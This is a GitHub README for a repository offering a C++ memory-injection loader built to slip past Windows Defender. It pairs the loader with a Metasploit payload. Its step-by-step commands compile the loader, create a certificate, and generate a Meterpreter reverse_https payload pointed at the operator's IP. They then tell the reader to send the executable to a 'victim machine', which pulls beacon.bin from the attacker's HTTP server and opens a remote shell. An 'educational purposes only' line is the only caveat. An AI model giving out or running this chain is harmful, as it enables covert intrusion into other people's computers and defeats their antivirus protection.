<h1 align="center">💀Evade Windows AV💀</h1>

<br>

>This repository focuses on storing a memory injection code written in c++ in order to evade windows defender, also using a metasploit payload.
>

>
>Obs: These scripts are for educational purposes only. Use them at your own risk!

>Works on Linux!
>

<br>

<p align="center">
	<img width="400" height="400" src="https://github.com/EndlssNightmare/BypassAV/blob/main/Fotos/metasploit-ascii-1-2.png">
</p>

<br>

<body>
   <h2 align="left"> Dependences:</h2>

<br>

  >
  >Create a SSL/TLS Certificate:<a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html"> SSL Certificate</a>
  >

  >
  >C/C++ Compiler:<a href="https://www.mingw-w64.org" > Mingw32</a>
  >

  >
  >Metasploit Framework:<a href="https://www.metasploit.com"> Metasploit Framework</a>>
  >
<br>

  <h2 align="left"> How to run the script:</h2>

<br>

Upgrade your apt package: `sudo apt update && sudo apt upgrade`

<br>

Install the C/C++ compiler: `sudo apt-get install g++-mingw-w64-x86-64`

<br>

Compile the code: `x86_x64-w64-mingw32-g++ --static -o name.exe BypassAV.cpp -fpermissive -lws2_32`

<br>

Create a SSL/TLS Certificate: 

<br>

```
$ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
rm -f www.example.com.key  www.example.com.crt
```

<br>

Create your own Metasploit configured payload: `msfvenom -p windows/x64/meterpreter/reverse_https lhost=yourip lport=port HandlerSSLCert=/home/kali/www.example.com.pem StagerVerifySSLCert=true -f raw -o beacon.bin`

<br>

Send the executable file to the victim machine.

<br>

Set a listener on msfconsole: `msfconsole -r meta.rc`

<br>

Set a http listener to grab de beacon.bin with the executable on victim machine: `python -m http.server 8000`

<br>

On the executable, set your ip, the port of http server and the beacon.bin file: `./BypassAV.exe YOURIP HTTPPORT beacon.bin`

<br>

## References and Credits:
  
  <br>

  ><a href="https://github.com/TheD1rkMtr/Shellcode-Hide"> Repository reference.</a>
  >
  ><a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html"> Custom SSL/TSL Certificate.</a>
  >
  ><a href="https://www.youtube.com/@gemini_security"> Gemini Security</a>

  <br>
